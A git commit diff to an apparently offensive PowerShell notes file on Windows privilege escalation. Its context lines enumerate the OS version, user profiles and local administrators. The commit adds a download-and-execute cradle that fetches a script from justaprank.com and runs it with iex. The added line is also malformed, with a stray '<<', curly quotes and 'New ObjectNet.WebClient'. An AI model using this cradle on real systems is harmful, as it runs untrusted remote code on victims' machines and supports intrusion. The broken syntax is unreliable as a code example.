c2c125dbbb8fff6e9e5e747df8176b9f202afc92
droppedpackets <56236210+dr0pp3dpack3ts@users.noreply.github.com>
2021-08-20 13:12:47 -0700

    Update # A Windows Privilege Escalation!.ps1

--- # A Windows Privilege Escalation!.ps1
+++ # A Windows Privilege Escalation!.ps1
@@ -7,3 +7,8 @@
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" ### OS name and version
 Get-ChildItem C:\Users -Force | Select-Object Name ### Lists all user profiles on machine.
 net localgroup administrators ### Lists all administrator groups
+
+
+<< $url = ‘https://www.justaprank.com/scripts/script1.ps1′
+iex ((New ObjectNet.WebClient).DownloadString($url))
+#
